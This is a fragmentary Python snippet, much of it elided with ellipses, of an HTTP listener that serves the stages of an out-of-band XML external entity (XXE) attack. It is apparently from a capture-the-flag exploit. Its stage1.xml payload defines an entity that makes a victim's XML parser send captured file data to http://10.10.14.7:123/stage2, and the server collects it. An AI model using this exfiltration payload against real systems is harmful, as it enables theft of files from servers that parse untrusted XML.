    ...
    def do_GET(self):
        ...
        try:
            ...
            if stage == '/stage1.xml':
                ...
                <!ENTITY % fetch "<!ENTITY afile SYSTEM 'http://10.10.14.7:123/stage2?%data;'>">"""
            if stage == '/stage2':
                message = ""
                #print(data)
...
"""  
        ...
        return
    def log_message(self, fromat, *args):
        return

def run():
    print('Starting server')
    server_address1=('0.0.0.0',123)
    httpd=HTTPServer(server_address1, HTTP_RequestHandler)
    httpd.serve_forever()
